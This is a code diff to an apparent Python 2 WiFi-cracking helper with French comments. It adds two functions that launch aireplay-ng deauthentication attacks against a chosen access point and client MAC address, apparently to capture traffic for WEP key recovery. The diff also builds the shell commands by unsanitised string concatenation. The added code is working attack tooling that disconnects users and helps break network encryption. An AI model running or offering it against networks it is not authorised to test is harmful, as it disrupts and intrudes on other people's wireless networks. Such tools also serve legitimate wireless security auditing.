@@ -69,6 +69,17 @@ def arp_attack(registered_network):
 	return pro.pid
 
 """
+    deauthentification pour capturer plus de trucs
+"""
+def deau_attack(BSSID, mac_client):
+    cmd = "aireplay-ng -0 10 -a " + BSSID + " -c " + mac_client + " mon0 --ignore-negative-one"
+    print cmd
+
+    FNULL = open(os.devnull, 'w')
+    pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
+    return pro.pid
+
+"""
 	Decryptage des iv/cap pour l'obtention de la clé
 	datafile_path : dossiers dans lesquels sont les .cap/.iv
 """
@@ -78,3 +89,13 @@ def aircrack_final_wep(datafile_path):
 	FNULL = open(os.devnull, 'w')
 	pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
 	return pro.pid
+
+def deauthentification_attack(box, client):
+    BSSID = box._BSSID
+    mac_client = client._MAC_CLIENT
+    cmd = "aireplay-ng -0 10 -a " + BSSID + " -c " + mac_client + " mon0 --ignore-negative-one"
+    print cmd
+
+    FNULL = open(os.devnull, 'w')
+    pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
+    return pro.pid
